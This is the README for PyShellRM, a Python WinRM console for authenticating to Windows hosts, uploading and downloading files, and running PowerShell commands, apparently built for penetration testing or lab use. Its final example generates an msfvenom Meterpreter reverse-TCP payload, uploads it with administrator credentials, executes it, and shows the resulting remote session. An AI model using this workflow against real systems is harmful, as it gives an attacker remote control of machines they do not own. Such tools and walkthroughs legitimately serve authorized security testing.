# PyShellRM

## Configuration

All configuration options are defined in the Protocol object.

1. Server: The WinRM webservice endpoint
    * `10.10.10.1` or `server.com`

2. Port: Transport type
    *  \[`ntlm`, `kerberos`, `credssp`]

3. Path: Wsman path
    * `weird/path/to/wsman`

3. Username: The remote user's username
    *  `domain\user`

4. Password: The remote user's password
    *  `hunter2`

5. SSL: Whether or not the request is HTTP or HTTPS
    *  \[`true`, `false`]

```Yaml
server:
    server: 10.10.10.149
    port: 5985
    auth: ntlm
    username: Administrator
    password: hunter2
    ssl: false
```

## Commands

1. hosts
2. test
3. test-all
4. connect
5. set
6. unset
7. upload
8. download
9. run
10. exit/quit

### Hosts

Lists the available hosts imported from the config.yml file.

Example:

```
pyshellrm:~$ hosts
server_conn_pass server_conn_fail
```

### Test

Test authenticating to the remote server.

Example:

```
pyshellrm:~$ test server_conn_pass
[+] Successfully connected to server_conn_pass with Administrator:hunter2
```

Because we're using Riposte, we can use the -c flag to run the `test` command from the cli:

```
$ python pyshellrm.py -c 'test server_conn_pass' config.yml
[+] Successfully connected to server_conn_pass with Administrator:hunter2
```

### Test-All

Test authenticating to all remote servers.

Example:

```
pyshellrm:~$ test-all
[+] Successfully connected to server_conn_pass with Administrator:hunter2
[-] Failed to auth with server_conn_fail using Administrator:hunter3
```

Because we're using Riposte, we can use the -c flag to run the `test-all` command from the cli:

```
$ python pyshellrm.py -c 'test-all' config.yml
[+] Successfully connected to server_conn_pass with Administrator:hunter2
[-] Failed to auth with server_conn_fail using Administrator:hunter3
```

### Connect

Connect uses the defined Protocol object to attempt a WinRM connection.

Example:

```
pyshellrm:~$ connect server
[+] Successfully connected to server with Administrator:hunter2
```

### Set

Sets the current server connection.

Example:

```
pyshellrm:~$ set server_conn_pass
```

### Unset

Unsets the current server connection.

Example:

```
pyshellrm:~$ unset
```

### Upload

Uploads a file from `local_path` to `remote_path`.

Example:

```
pyshellrm:~$ upload "/local/path/to/shell.exe" "C:\\Users\\Administrator\\Documents\\shell.exe"
pyshellrm:~$ run ls
[+]

    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/13/2019  10:10 AM          73802 shell.exe
```

### Download

Downloads a file from `remote_path` to `local_path`.

pyshellrm:~$ download "C:\\Users\\Administrator\\Documents\\doc.xlsx" "/local/path/to/doc.xlsx"

### Run

Runs commands in a Powershell prompt. Press ctrl+c to exit.

Example:

```
pyshellrm:~$ run ls
[+]

    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/13/2019  10:10 AM          73802 shell.exe
```

### Exit/Quit

Exits PyShellRM.

## Example

First we'll generate an msfvenom payload.

```
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=9999 -f exe > shell.exe
```

Next we'll configure our Protocol.

```Yaml
server:
    server: 10.10.10.1
    port: 5985
    auth: ntlm
    username: Administrator
    password: hunter2
    ssl: false
```

Finally, we can launch the PyShellRM console and upload our reverse shell.

```
pyshellrm:~$ connect server
[+] Successfully connected to server with Administrator:hunter2
pyshellrm:~$ set server
pyshellrm:~$ upload shell.exe "C:\\Users\\Administrator\\Documents\\shell.exe"
pyshellrm:~$ run ls
[+]

    Directory: C:\Users\Administrator\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        8/13/2019  10:10 AM          73802 shell.exe

pyshellrm:~$ run "cmd.exe /c \"shell.exe\""
```

Callback received!

```
payload => windows/meterpreter/reverse_tcp
lhost => 10.10.14.2
lport => 9999
[*] Started reverse TCP handler on 10.10.14.2:9999 
[*] Sending stage (179779 bytes) to 10.10.10.1
[*] Meterpreter session 1 opened (10.10.14.2:9999 -> 10.10.10.1:49692) at 1970-01-01 00:00:00 0000

meterpreter > getuid
Server username: REMOTESERVER\Administrator
```
